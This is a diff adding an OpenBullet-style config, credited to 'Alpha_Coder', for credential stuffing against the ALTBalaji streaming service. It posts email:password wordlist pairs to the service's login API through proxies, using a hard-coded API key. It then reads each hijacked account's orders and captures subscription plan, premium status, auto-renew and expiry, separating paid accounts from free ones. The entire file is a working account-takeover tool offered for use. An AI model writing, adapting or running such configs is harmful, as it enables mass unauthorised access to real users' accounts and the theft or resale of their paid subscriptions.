@@ -1,0 +1,117 @@
+[SETTINGS]
+{
+  "Name": "Atl Balaji",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-07-11T15:29:05.8308011+06:00",
+  "AdditionalInfo": "",
+  "Author": "Alpha_Coder (╬ ಠ益ಠ) _|__ <3",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login_Req REQUEST POST "https://payment-ms.cloud.altbalaji.com/v1/accounts/login/email?domain=IN" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: payment-ms.cloud.altbalaji.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Content-Length: 64" 
+  HEADER "pp-ms-id: 060e6289-274d-4d1e-8920-3378b791d143" 
+  HEADER "pp-ms-api-key: qvjI+t6hykyNaTJqKE1yIoSbNGDFECJ9bKPnYXz0L9fabimAGfw/d/scP6SvOapba5h0pSp16RO7qdV/ZaFX9Q==" 
+  HEADER "Origin: https://www.altbalaji.com" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Referer: https://www.altbalaji.com/" 
+  HEADER "Connection: keep-alive" 
+  HEADER "TE: trailers" 
+
+#Auth_Token PARSE "<SOURCE>" LR "session_token\":\"" "\"," -> VAR "Auth_Token" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Username and password do not match" 
+    KEY "<RESPONSECODE>" Contains "404" 
+  KEYCHAIN Success OR 
+    KEY "session_token\":\"" 
+
+#Status_Req REQUEST GET "https://payment.cloud.altbalaji.com/accounts/orders?limit=50" 
+  
+  HEADER "Host: payment.cloud.altbalaji.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "XSSESSION: <Auth_Token>" 
+  HEADER "Origin: https://www.altbalaji.com" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Referer: https://www.altbalaji.com/" 
+  HEADER "Connection: keep-alive" 
+
+#Premium PARSE "<SOURCE>" LR "payment_type\":\"" "\",\"" CreateEmpty=FALSE -> CAP "Premium" 
+
+#Orders PARSE "<SOURCE>" LR "orders\":" "," -> VAR "Orders" 
+
+#ck_order FUNCTION Length "<Orders>" -> VAR "Orders" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<Premium>" Contains "pending" 
+    KEY "<Orders>" EqualTo "2" 
+  KEYCHAIN Success OR 
+    KEY "<Orders>" Contains "[{\"id\":" 
+
+#Plan PARSE "<SOURCE>" LR "en\":\"" "\"," CreateEmpty=FALSE -> CAP "Plan" 
+
+#Auto_Renew PARSE "<SOURCE>" LR "recurring\":" "," CreateEmpty=FALSE -> CAP "Auto_Renew" 
+
+#Expiry PARSE "<SOURCE>" LR "valid_to\":\"" "T" CreateEmpty=FALSE -> CAP "Expiry" 
+
+FUNCTION Constant "Alpha_Coder (╬ ಠ益ಠ) _|__ <3" -> CAP "Config By" 
+
